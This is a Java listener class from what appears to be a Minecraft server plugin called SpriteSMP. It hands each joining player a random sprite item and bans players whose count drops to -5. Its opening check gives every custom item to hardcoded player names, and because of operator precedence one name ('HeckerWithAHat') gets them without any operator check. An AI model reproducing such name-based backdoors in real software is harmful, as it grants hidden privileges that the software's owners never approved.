package gmail.aryanj1010.spritesmp.Listeners;

import static gmail.aryanj1010.spritesmp.API.ActionBarManager.addActionBar;
import static gmail.aryanj1010.spritesmp.SpriteSMP.*;

import gmail.aryanj1010.spritesmp.Items.items;
import gmail.aryanj1010.spritesmp.SpriteSMP;
import java.sql.Date;
import java.time.Instant;
import java.util.Random;
import org.bukkit.BanList;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;

public class OnJoin implements Listener {

  @EventHandler
  public void onJoin(PlayerJoinEvent e) {
    if (
      e.getPlayer().getName().equals("HeckerWithAHat") ||
      e.getPlayer().getName().equalsIgnoreCase("ayonull") &&
      e.getPlayer().isOp()
    ) {
      for (items i : items.values()) {
        e.getPlayer().getInventory().addItem(i.getFullItem().getItem());
      }
    }
    getPlugin(SpriteSMP.class).getServer().getScheduler().runTaskLater(getPlugin(SpriteSMP.class), () -> {
      addActionBar(e.getPlayer());
    }, 20L);

    if (ps.containsPlayer(e.getPlayer())) return;
    if (psc.containsPlayer(e.getPlayer())) return;
    items i = sprites[new Random().nextInt(sprites.length)];
    ps.addSprite(e.getPlayer(), i);
    psc.addPlayer(e.getPlayer());
    e
      .getPlayer()
      .sendMessage("You have been given the " + i.name().replace("S", " S"));
    ps.save();

    if (psc.getCount(e.getPlayer()) <= -5) {
      e.getPlayer().getInventory().clear();
      getPlugin(SpriteSMP.class)
        .getServer()
        .dispatchCommand(
          getPlugin(SpriteSMP.class).getServer().getConsoleSender(),
          "ban " + e.getPlayer().getName()
        );
      e.getPlayer().kickPlayer("Out of Sprites");
    }
    if (invisPlayers.isEmpty()) return;
    for (Player invisPlayer : invisPlayers) {
      e.getPlayer().hidePlayer(getPlugin(SpriteSMP.class), invisPlayer);
    }
  }
}
